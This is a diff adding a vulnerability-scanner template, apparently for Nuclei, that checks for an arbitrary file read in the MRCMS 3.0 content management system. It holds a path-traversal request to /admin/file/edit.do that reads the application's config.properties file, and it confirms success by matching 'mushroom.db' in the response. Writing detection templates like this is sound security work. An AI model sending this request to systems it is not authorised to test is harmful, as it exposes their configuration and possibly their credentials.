@@ -1,0 +1,19 @@
+id: MRCMS-edit-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: MRCMS 是一款Java开发的内容管理系统，采用数据模型+模板+插件实现，内置提供了文章模型发布功能。
+  reference:
+    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/MRCMS3.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/file/edit.do?path=../resources/config.properties&name="
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'mushroom.db'
